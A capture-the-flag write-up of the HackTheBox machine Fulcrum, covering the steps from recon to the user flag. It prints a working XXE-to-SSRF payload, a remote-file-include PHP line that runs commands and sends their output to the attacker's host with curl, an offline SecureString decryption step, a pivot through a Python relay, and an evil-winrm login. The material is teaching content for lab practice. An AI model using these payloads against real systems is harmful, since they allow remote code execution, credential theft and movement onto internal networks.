## Overview

Fulcrum is an insane-difficulty box that begins as a Linux web target and turns out to be a KVM hypervisor fronting an internal Windows Active Directory network. The foothold is a two-bug chain — an XXE that becomes a server-side request forgery, fed into a localhost-only PHP file-include that we abuse as a remote file include for code execution. From there a sloppily "encrypted" credential and a hand-rolled pivot get us onto the internal Windows VMs and the user flag. This post covers recon through `user.txt`.

Bespoke XXE-to-SSRF-to-RFI chain plus offline SecureString hardcoded-key decryption and a hand-rolled Python TCP relay pivot make custom the dominant axis; no named CVE.

## Recon

| Port | Service | Note |
|------|---------|------|
| 4 | nginx / PHP | `index.php?page=` file include (root `/var/www/uploads`) |
| 56423 | nginx / PHP | JSON API, returns `{"Heartbeat":{"Ping":"Pong"}}` |
| 80 | nginx | `proxy_pass` to an internal host |
| 88 | nginx / PHP | phpMyAdmin |

```bash
nmap -p- --min-rate=1000 -sV 10.129.136.254
```

Multiple nginx instances on odd ports hint at containers/VMs behind the box. Two matter: port 56423 (an XML-ish API) and port 4 (a PHP app with a `page=` include parameter).

## Enumeration

Port 56423 answers a simple heartbeat:

```bash
curl -s http://10.129.136.254:56423/
# {"Heartbeat":{"Ping":"Pong"}}
```

Submitting XML to it instead reveals it parses external entities (XXE). Port 4's `index.php?page=` is a file-include endpoint, but it is only reachable from localhost. Those two facts combine into the foothold.

## Foothold

The XXE entity is fetched **server-side**, so it can reach `127.0.0.1:4` that we cannot. We point the entity at the port-4 include endpoint and make *that* server include a PHP file we host — a remote file include, which PHP executes:

```bash
curl -s http://10.129.136.254:56423 -X POST -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.16.13:8000/writeup">]><foo>&xxe;</foo>'
```

Because the port-4 request carries no parameters of its own, the command is baked straight into the hosted `writeup.php` (rather than read from `$_GET`), and the output is exfiltrated back to a small listener:

```php
<?php system('id | base64 -w0 | curl -s --data-binary @- http://10.10.16.13:8000/o'); ?>
```

Triggering the XXE returns `uid=33(www-data)` — code execution on the Linux host. Using this as a command oracle, the host turns out to be a KVM hypervisor (`virbr0`, `192.168.122.0/24`), and an upload script leaks a credential for an internal Windows VM:

```bash
# via the RCE oracle:
cat /var/www/uploads/Fulcrum_Upload_to_Corp.ps1
cat /etc/nginx/sites-available/default     # port 80 -> proxy_pass 192.168.122.228
```

The script stores a PowerShell credential encrypted with `ConvertTo-SecureString -Key`, but the AES key is hardcoded in the same file — so it decrypts offline to the `WebUser` password. With `socat` absent but `python3` present, a tiny Python TCP relay on the foothold exposes the internal VM's WinRM port to us, and `web.config` on that VM plus a known service account chain into a shell on the internal FILE server.

```bash
evil-winrm -i 10.129.136.254 -u WebUser -p '<redacted>' -P 5985
# type C:\Inetpub\wwwroot\web.config   -> internal LDAP / service creds
```

## User flag

```bash
# user.txt -> HTB{...}
```

Access as `btables` on the FILE server achieved.
